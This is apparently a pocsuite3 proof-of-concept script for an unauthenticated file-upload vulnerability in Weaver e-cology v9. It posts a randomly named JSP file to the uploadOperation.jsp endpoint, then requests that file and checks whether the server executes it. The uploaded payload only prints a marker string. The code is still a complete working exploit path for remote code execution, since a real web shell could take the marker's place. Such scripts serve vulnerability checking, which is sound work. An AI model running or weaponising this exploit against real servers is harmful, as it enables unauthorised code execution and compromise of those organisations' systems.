#!/usr/bin/env python
# -*- coding: utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url
import random


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''泛微e-cology_uploadOperation_file-upload'''
    desc = ''''''
    solution = ''''''
    severity = '''high'''
    vulType = '''file-upload'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''e-cology'''
    appVersion = '''v9'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url, ip, port = parse_ip_port(self.target, 80)
        verify_url = make_verify_url(self.url,  "/page/exportImport/uploadOperation.jsp", mod=0)
        filename = ''.join(random.sample('asdfghjklqwertyuiopzxcvbnm', 5)) + '.jsp'
        shell = '<%out.print("testtesttest");%>'
        files = {'file':(filename, shell, 'Content-Type:multipart/form-data')}
        resp = requests.post(verify_url, files=files, verify=False, timeout=20)
        if resp.status_code == 200:
            shell_url = make_verify_url(self.url,  "/page/exportImport/fileTransfer/{name}".format(name=filename), mod=0)
            res = requests.get(shell_url, verify=False, timeout=20)
            if b'testtesttest' in res.content and res.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = self.url
                result['VerifyInfo']['port'] = port
        return self.parse_attack(result)

    _attack = _verify

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
